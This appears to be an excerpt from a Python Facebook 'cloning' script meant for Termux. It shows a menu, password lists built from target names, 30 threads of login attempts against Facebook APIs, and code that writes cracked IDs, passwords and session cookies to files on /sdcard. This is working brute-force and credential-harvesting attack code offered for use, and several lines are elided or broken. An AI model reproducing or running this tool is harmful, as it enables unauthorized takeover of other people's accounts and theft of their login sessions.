...
def menu():
			clear()
		#	linex()
			print('\033[1;96m[1] File cloning\033[0m\n\033[1;96m[2] join facebook\033[0m\n\033[1;96m[0] Exit menu\033[0m')
			linex()
		...
		#	os.system('xdg-open https://www.facebook.com/dr.paigham')
			if xd in ['1','01']:
				...
				linex()
				print('\033[1;33m[1] \033[1;37mMethod  (for mix ids)  \033[1;32m (fast) \n\033[1;33m [2] \033[1;37mMethod  (for mix ids) \033[1;32m  (recommend)  \n\033[1;33m [3]\033[1;37m Method  (with cokies)\033[1;32m   (v.fast)\033[0m')
				linex()
				mthd=input('Choose: ')
				linex()
				plist = []
				try:
					ps_limit = int(input(' \033[1;94mHow many passwords do you want to add ? '))
				except:
					ps_limit =1
				clear()
				print('\033[1;96m exp: first last,firtslast,first123,firstlast123,First Last')
				linex()
				...
				with tred(max_workers=30) as crack_submit:
					...
					print(' \033[1;93mThe process is running in the background')
					linex()
					for user in fo:
				...
				print('\033[1;37m')
				linex()
				print(' \033[1;96mThe process has completed')
...
def api2(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;92m [STAR-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;91m [STAR-OK] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/STAR-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/STAR-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;31m[STAR-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\033[1;93m [STAR-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/STAR-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/STAR-CP.txt','a').write(ids+'|'+pas+'\n')
...
def api3(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\033[1;92m [STAR-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
